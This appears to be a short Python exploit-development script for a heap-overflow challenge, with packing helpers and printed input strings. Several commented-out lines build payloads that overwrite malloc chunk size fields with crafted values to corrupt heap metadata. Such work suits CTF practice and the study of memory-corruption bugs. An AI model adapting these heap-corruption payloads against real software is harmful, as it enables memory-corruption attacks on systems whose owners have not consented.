#!/usr/bin/env python

from __future__ import print_function
from functools import partial
import struct


p64 = partial(struct.pack, "<Q")
p32 = partial(struct.pack, "<I")
ps64 = partial(struct.pack, "<q")
ps32 = partial(struct.pack, "<i")
pr = partial(print, end="")

# The returned chunk has real size of 0x28 althogh only 0x20 is requested:
#     malloc(32) -> 0x20 + 0x8 -> 0x27 + "\x00"
pr("a" * 0x19 + ' ' + "b" * 0x19 + ' ' + "c" * 0x19)
# pr("a" * 0x28 + "\x28" + ' ' + "b" * 0x27 + ' ' + "c" * 0x27)
# pr("a" * 0x28 + ps64(-32) + ' ' + "b" * 0x20 + ps64(-32) + ' ' + "c" * 0x27)
# pr("a" * 0x27 + "\x28" + ' ' + "b" * 0x28 + p32(0x1111) + ' ' + "c" * 0x20 + p32(0x1110))
